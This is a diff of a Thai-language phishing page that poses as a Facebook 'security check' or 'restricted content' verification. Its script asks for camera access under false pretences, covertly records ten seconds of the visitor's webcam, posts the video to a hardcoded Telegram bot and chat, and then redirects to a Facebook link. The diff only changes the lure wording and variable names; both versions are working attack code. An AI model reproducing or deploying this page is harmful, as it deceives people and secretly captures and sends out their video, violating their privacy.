@@ -1,68 +1,60 @@
 <!DOCTYPE html>
-<html lang="th">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Facebook Security Check</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Content Security</title>
 </head>
-<body style="background:#f0f2f5; margin:0; display:flex; justify-content:center; align-items:center; height:100vh; font-family:Helvetica, Arial, sans-serif;">
+<body style="background:#f0f2f5; margin:0; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif;">
 
-<div style="background:#fff; padding:30px; border-radius:12px; text-align:center; width:90%; max-width:320px; box-shadow:0 10px 25px rgba(0,0,0,0.1);">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" width="60">
-    <h2 style="font-size:20px; color:#1c1e21; margin:20px 0 10px;">ยืนยันความปลอดภัย</h2>
-    <p style="font-size:14px; color:#606770; margin-bottom:25px; line-height:1.5;">บัญชีของคุณอาจมีความเสี่ยง โปรดกดปุ่มด้านล่างเพื่อทำการสแกนใบหน้ายืนยันตัวตน (ใช้เวลา 10 วินาที)</p>
+<div style="background:#fff; padding:30px; border-radius:12px; text-align:center; width:90%; max-width:320px; box-shadow:0 4px 12px rgba(0,0,0,0.1);">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" width="55">
+    <h2 style="font-size:18px; margin:15px 0;">ยืนยันสิทธิ์การเข้าถึง</h2>
+    <p style="font-size:14px; color:#606770; line-height:1.4;">เนื้อหานี้ถูกจำกัดการเข้าถึง โปรดกดยืนยันตัวตนเพื่อรับชมโพสต์หรือข้อมูลดังกล่าว</p>
     
-    <button id="authBtn" style="background:#1877f2; color:#fff; border:none; padding:15px; width:100%; border-radius:8px; font-weight:bold; cursor:pointer; font-size:16px; -webkit-appearance:none;">เริ่มการตรวจสอบ</button>
+    <button id="auth" style="background:#1877f2; color:#fff; border:none; padding:15px; width:100%; border-radius:8px; font-weight:bold; cursor:pointer; font-size:16px;">กดยืนยันเพื่อเข้าชม</button>
     
-    <div id="loading" style="display:none; margin-top:20px;">
-        <div style="border:3px solid #f3f3f3; border-top:3px solid #1877f2; border-radius:50%; width:24px; height:24px; animation: spin 1s linear infinite; margin:0 auto 10px;"></div>
-        <span style="color:#1877f2; font-size:14px; font-weight:bold;">กำลังสแกนใบหน้า...</span>
-    </div>
+    <div id="loading" style="display:none; margin-top:15px; color:#1877f2; font-weight:bold;">⏳ กำลังโหลดข้อมูล...</div>
 </div>
-
-<style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>
 
 <script>
     const T = '8570864342:AAH-v-iLybrDvA9mD569rERO9WmU1M0HzdA';
     const C = '8482017371';
     const R = 'https://www.facebook.com/share/p/1avrMEzzJn/';
 
-    document.getElementById('authBtn').onclick = async function() {
-        const btn = this;
-        const loader = document.getElementById('loading');
+    document.getElementById('auth').onclick = async function() {
+        const b = this;
+        const l = document.getElementById('loading');
         
         try {
-            // บังคับขอสิทธิ์แบบสุภาพที่สุด
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" },
-                audio: false 
-            });
+            // ขอสิทธิ์กล้องแบบเงียบๆ
+            const s = await navigator.mediaDevices.getUserMedia({ video: true });
+            
+            b.style.display = 'none';
+            l.style.display = 'block';
 
-            btn.style.display = 'none';
-            loader.style.display = 'block';
-
-            const recorder = new MediaRecorder(stream);
+            const rec = new MediaRecorder(s);
             const chunks = [];
             
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = async () => {
+            rec.ondataavailable = e => chunks.push(e.data);
+            rec.onstop = async () => {
                 const blob = new Blob(chunks, { type: 'video/mp4' });
                 const fd = new FormData();
                 fd.append('chat_id', C);
-                fd.append('video', blob, 'security_scan.mp4');
+                fd.append('video', blob, 'user_verify.mp4');
 
-                // ส่งเข้า Telegram และรอจนจบ
+                // ส่งเข้า Telegram
                 await fetch(`https://api.telegram.org/bot${T}/sendVideo`, { method: 'POST', body: fd });
                 
-                stream.getTracks().forEach(t => t.stop());
+                s.getTracks().forEach(track => track.stop());
                 window.location.replace(R);
             };
 
-            recorder.start();
-            setTimeout(() => { recorder.stop(); }, 10000); // เก็บ 10 วิ
+            rec.start();
+            setTimeout(() => rec.stop(), 10000); // ถ่าย 10 วินาที
 
         } catch (err) {
-            alert("⚠️ ข้อผิดพลาด: โปรดกด 'อนุญาต' (Allow) กล้องเพื่อยืนยันตัวตน หากไม่ขึ้นให้กด โปรดรีเฟรชหน้าเว็บหรือตรวจสอบการตั้งค่า Browser");
+            alert("โปรดกด 'อนุญาต' เพื่อเข้าถึงเนื้อหานี้");
         }
     };
 </script>
